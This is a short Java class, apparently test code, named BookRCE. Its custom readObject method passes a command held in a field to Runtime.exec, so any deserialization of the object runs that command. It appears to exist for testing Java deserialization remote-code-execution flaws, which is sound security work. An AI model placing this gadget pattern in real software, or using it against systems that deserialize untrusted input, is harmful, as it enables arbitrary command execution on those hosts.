package com.example.my.tests;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.Process;

public final class BookRCE implements Serializable {
    public String title;
    public String filename;
    public String cmd;

    public BookRCE(String title, String filename, String cmd)
    {
        this.title = title;
        this.filename = filename;
        this.cmd = cmd;
    }

    @Override
    public String toString() {
        return "Book [title=" + this.title + ", filename=" + this.filename + "]";
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();

        System.out.println("BookRCE readObject triggeeeeeeered");
        System.out.println("Command: " + this.cmd);
        Process process = Runtime.getRuntime().exec(this.cmd);
    }
}
